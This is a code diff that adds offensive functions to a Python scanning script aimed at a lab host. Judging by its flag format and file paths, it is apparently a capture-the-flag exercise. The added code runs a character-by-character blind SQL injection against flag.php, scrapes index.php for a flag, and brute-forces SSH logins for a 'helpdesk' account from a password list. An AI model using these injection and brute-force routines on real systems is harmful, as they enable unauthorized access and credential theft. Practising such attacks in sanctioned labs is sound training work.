@@ -1,6 +1,8 @@
 import socket
 import requests
-
+import string
+import paramiko
+import time
 
 def portScanner():
     while True:
@@ -62,11 +64,58 @@ def cveFinder(versionDict):
     stuff2 = str(r.content).split("ID")[4][3:16]
     print("{} has CVE/s {}, {}, and {}...".format(versionDict[22], stuff, stuff1, stuff2))
 
+def webOffensive():
 
+    characters = list(string.ascii_lowercase+ string.ascii_uppercase+string.digits+'{'+'}')
+    url = 'http://10.12.0.30/flag.php'
+    passwd = ''
+    while True:
+        for char in characters:
+            data = {'flag': "'OR value LIKE BINARY '{}%'#'".format(passwd+char)}
+            r = requests.post(url, data=data)
+            if 'exists' in r.text:
+                passwd = passwd+char
+                if passwd[-1] == '}':
+                    print('The flag is: {}'.format(passwd))
+                    return
+
+def webOffensiveIndexPHP():
+    url = 'http://10.12.0.30/index.php'
+    r = requests.get(url)
+    raw = str(r.content)
+    lines = raw.split(".")
+    for line in lines:
+        if line.find("CNS{") != -1:
+            if len(line[line.find("CNS{"):line.find("}")+1]) == 37:
+                print(line[line.find("CNS{"):line.find("}")+1])
+                return(line[line.find("CNS{"):line.find("}")+1])
+
+
+def bruteForce():
+    user = 'helpdesk'
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    with open(b'C:\Users\student\Downloads\passwords.txt', 'r') as f:
+        for each in f:
+            line = each.strip()
+            try:
+                client.connect(hostname='10.12.0.30', username=user, password=line, timeout=3)
+            except socket.timeout:
+                print("Unreachable")
+            except paramiko.AuthenticationException:
+                print("Wrong Creds")
+            except paramiko.SSHException:
+                print("Exception")
+                time.sleep(60)
+            else:
+                print("Username: {}  Password: {}".format(user,line))
+                return
 
 if __name__ == "__main__":
     # These will give you all open ports, services/versions, and vulnerabilities
     #versionDict = portScanner()
     #cveFinder(versionDict)
-
+    #webOffensive()
+    #bruteForce()
+    webOffensiveIndexPHP()
 
